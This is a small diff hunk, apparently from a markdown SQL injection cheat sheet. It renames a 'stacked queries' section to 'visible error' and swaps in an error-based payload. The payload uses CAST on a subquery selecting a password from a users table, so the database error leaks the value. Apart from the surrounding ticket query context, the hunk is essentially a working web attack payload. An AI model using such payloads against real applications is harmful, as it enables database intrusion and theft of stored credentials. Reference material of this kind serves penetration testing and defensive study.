@@ -44,10 +44,11 @@ SELECT name,issue_date,valid_until FROM tickets WHERE ticket_id="
 "
 ```
 
-### stacked queries
+### visible error
+CAST does variable operations, can trigger error containing its output
 ```diff
 SELECT * FROM users WHERE id='
--1'||'SELECT * FROM dual
+-1'; 1=CAST((SELECT password FROM users LIMIT 1) AS int);--
 '
 ```
 
